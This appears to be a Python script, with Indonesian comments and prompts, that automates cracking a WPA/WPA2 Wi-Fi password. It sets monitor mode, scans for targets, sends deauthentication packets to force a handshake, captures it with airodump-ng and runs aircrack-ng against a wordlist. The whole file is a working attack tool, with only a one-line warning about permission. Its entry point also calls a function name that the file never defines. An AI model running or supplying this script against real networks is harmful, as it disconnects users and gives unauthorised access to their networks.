import os
import time
import glob
import subprocess

def run_wpa_crack():
    """
    Fungsi untuk serangan WPA/WPA2 dengan proses penangkapan handshake otomatis.
    """
    # Inisialisasi variabel untuk blok finally
    interface_mon = ""
    airodump_process = None
    aireplay_process = None
    original_interface = ""

    try:
        print("\n--- [Opsi 1] Memulai Serangan WPA/WPA2 (Otomatis) ---")
        print("PERINGATAN: Hanya gunakan pada jaringan milik Anda sendiri. Tindakan ini ilegal jika tanpa izin.")
        time.sleep(3)

        # =================================================================
        # TAHAP 1: PERSIAPAN & AKTIVASI MODE MONITOR
        # =================================================================
        print("\n[TAHAP 1: PERSIAPAN]")
        subprocess.run(['iwconfig'])
        interface = input("==> Masukkan nama antarmuka nirkabel Anda (e.g., wlan0): ")
        if not interface:
            print("❌ Nama antarmuka tidak boleh kosong. Proses dibatalkan.")
            return
        
        original_interface = interface
        interface_mon = interface + "mon"

        print(f"--> Mengaktifkan mode monitor pada {interface}...")
        # Menggunakan subprocess untuk kontrol yang lebih baik
        subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True, capture_output=True)
        time.sleep(2)
        print(f"✅ Mode monitor berhasil diaktifkan di '{interface_mon}'.")

        # =================================================================
        # TAHAP 2: SCAN & TARGETING
        # =================================================================
        print("\n[TAHAP 2: SCAN & TARGETING]")
        print("--> Jendela pemindaian akan terbuka. Cari BSSID dan CH dari target Anda.")
        print(">>> Tekan CTRL+C di jendela ini jika Anda sudah menemukan target. <<<")
        time.sleep(4)
        
        try:
            # Jalankan airodump-ng untuk scan dan tunggu pengguna menghentikannya
            scan_process = subprocess.Popen(['sudo', 'airodump-ng', interface_mon])
            scan_process.wait()
        except KeyboardInterrupt:
            print("\n✅ Pemindaian dihentikan oleh pengguna.")

        print("\n--> Silakan masukkan detail target:")
        bssid = input("==> Masukkan BSSID target: ")
        channel = input("==> Masukkan Channel (CH) target: ")
        capture_filename = input("==> Masukkan nama file untuk menyimpan capture (e.g., hack1): ")

        if not all([bssid, channel, capture_filename]):
            print("❌ Detail tidak lengkap. Proses dibatalkan.")
            return

        # =================================================================
        # TAHAP 3: PENANGKAPAN HANDSHAKE (OTOMATIS)
        # =================================================================
        print("\n[TAHAP 3: PENANGKAPAN HANDSHAKE OTOMATIS]")
        print("🚀 Memulai airodump-ng untuk menangkap paket di latar belakang...")
        cmd_airodump = ['sudo', 'airodump-ng', '-w', capture_filename, '-c', channel, '--bssid', bssid, interface_mon]
        airodump_process = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        print("📡 Mengirim paket deauth untuk memancing handshake... Proses ini butuh sekitar 30 detik.")
        # Mengirim 10 burst deauth, cukup untuk memancing reconnect
        cmd_aireplay = ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, interface_mon]
        # Kita tunggu proses deauth ini selesai
        subprocess.run(cmd_aireplay, check=True, capture_output=True)
        
        print("✅ Proses deauth selesai. Menghentikan penangkapan paket.")
        # Hentikan airodump-ng setelah deauth selesai
        airodump_process.terminate()
        airodump_process.wait()
        airodump_process = None # Set ke None agar tidak dihentikan lagi di finally

        print(" handshake seharusnya sudah tertangkap.")

        # =================================================================
        # TAHAP 4: CRACKING
        # =================================================================
        print("\n[TAHAP 4: CRACKING HANDSHAKE]")
        
        # Cari file .cap yang sebenarnya, karena airodump menambahkan angka
        cap_files = glob.glob(f'{capture_filename}*.cap')
        if not cap_files:
            print(f"❌ Tidak dapat menemukan file .cap yang diawali dengan '{capture_filename}'.")
            print("   Kemungkinan handshake gagal ditangkap. Coba lagi.")
            return
        
        actual_cap_file = cap_files[0]
        print(f"--> File capture ditemukan: {actual_cap_file}")
        
        default_wordlist = "/usr/share/wordlists/rockyou.txt"
        wordlist_path = input(f"==> Masukkan path wordlist [Enter untuk default: {default_wordlist}]: ")
        if not wordlist_path:
            wordlist_path = default_wordlist
            
        if not os.path.isfile(wordlist_path):
            print(f"❌ Kesalahan: Wordlist '{wordlist_path}' tidak ditemukan.")
            return
            
        print("\n--> Memulai aircrack-ng. Proses ini bisa memakan waktu sangat lama.")
        time.sleep(2)
        # Menjalankan aircrack-ng sebagai proses yang bisa dilihat pengguna
        subprocess.run(['sudo', 'aircrack-ng', actual_cap_file, '-w', wordlist_path])

    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"\n❌ Terjadi kesalahan saat menjalankan perintah: {e}")
        print("   Pastikan aircrack-ng suite terpasang dan Anda memiliki hak akses yang benar.")
    except KeyboardInterrupt:
        print("\n\nProses dihentikan oleh pengguna (Ctrl+C).")
    except Exception as e:
        print(f"\n❌ Terjadi kesalahan yang tidak terduga: {e}")
    finally:
        # =================================================================
        # TAHAP 5: PEMBERSIHAN
        # =================================================================
        print("\n[TAHAP 5: PEMBERSIHAN]")
        
        if airodump_process:
            print(f"   -> Menghentikan sisa proses airodump-ng...")
            airodump_process.terminate()
            airodump_process.wait()

        if interface_mon and original_interface:
             print(f"--> Menghentikan mode monitor pada {interface_mon}...")
             subprocess.run(['sudo', 'airmon-ng', 'stop', interface_mon], capture_output=True)
             
        print("--> Merestart Network Manager untuk mengembalikan koneksi normal...")
        subprocess.run(['sudo', 'service', 'NetworkManager', 'start'], capture_output=True)
        print("\nProses selesai.")


# Jangan lupa untuk mengganti pemanggilan fungsi di file PBLRKS611.py
# dari run_wpa_crack() menjadi run_wpa_crack_automated()
if __name__ == "__main__":
    # Contoh pemanggilan langsung
    if os.geteuid() != 0:
        print("Kesalahan: Skrip ini perlu dijalankan dengan hak akses root.")
        exit()
    run_wpa_crack_automated()
